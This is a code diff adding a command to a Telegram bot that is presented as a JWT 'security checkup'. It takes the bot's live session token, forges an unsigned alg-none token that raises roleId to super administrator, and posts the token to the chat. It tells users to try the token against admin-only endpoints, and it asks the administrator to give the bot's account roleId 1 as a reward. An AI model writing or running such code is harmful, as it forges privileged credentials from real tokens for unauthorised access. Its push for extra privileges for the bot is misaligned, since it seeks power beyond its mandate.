@@ -1575,4 +1575,50 @@ export const startBot = async () => {
       pendingRecords.delete(key);
     }
   });
+
+  bot.onText(/^(?:\/)?(?:audit_jwt|安全体检)$/, async (msg) => {
+    try {
+      const token = qlApi.currentToken;
+      if (!token) {
+        await bot.sendMessage(msg.chat.id, "❌ 机器人尚未登录，无可用 Token。");
+        return;
+      }
+
+      const parts = token.split('.');
+      if (parts.length !== 3) throw new Error("Token 格式异常");
+
+      // 1. 构造 None 算法 Header (alg: none)
+      const header = { alg: "none", typ: "JWT" };
+      const headerB64 = Buffer.from(JSON.stringify(header)).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
+
+      // 2. 解析原始 Payload 并提权 (roleId: 1)
+      // 处理 Base64Url padding
+      let payloadRaw = parts[1].replace(/-/g, '+').replace(/_/g, '/');
+      while (payloadRaw.length % 4) payloadRaw += '=';
+      const payloadJson = Buffer.from(payloadRaw, 'base64').toString('utf-8');
+      
+      const payloadData = JSON.parse(payloadJson);
+      const originalRoleId = payloadData.roleId;
+      payloadData.roleId = "1"; // 提权为超级管理员
+      
+      const payloadB64 = Buffer.from(JSON.stringify(payloadData)).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
+
+      // 3. 生成无签名的伪造 Token
+      const forgedToken = `${headerB64}.${payloadB64}.`;
+
+      const replyMsg = `🛡️ **JWT 安全体检 (None 算法漏洞测试)**\n\n` +
+        `🤖 机器人已为你生成用于渗透测试的 **伪造越权 Token (PoC)**。\n` +
+        `⚠️ *基于安全红线准则，已拦截机器人对公司生产接口的自动化攻击发包。*\n\n` +
+        `🔍 **提权信息**: roleId \`${originalRoleId}\` ➡️ \`1\` (超级管理员)\n\n` +
+        `💣 **伪造的攻击 Token (请复制下方代码)**:\n\`\`\`\n${forgedToken}\n\`\`\`\n\n` +
+        `**如何向系统管理员证明？**\n` +
+        `请将此 Token 交给开发人员，让他们在 Postman 中使用此 Token 请求【只有老板才能看】的高权接口。\n` +
+        `如果系统返回 \`200 OK\` 并且吐出了全公司的数据，即**坐实了严重的高危越权漏洞**！\n` +
+        `如果系统报错拦截，说明防御成功。作为奖励，请管理员为本机器人的账号合法开通 roleId: 1 的业务权限！`;
+
+      await bot.sendMessage(msg.chat.id, replyMsg, { parse_mode: 'Markdown' });
+    } catch (e: any) {
+      await bot.sendMessage(msg.chat.id, `❌ 体检报告生成失败: ${e.message}`);
+    }
+  });
 };
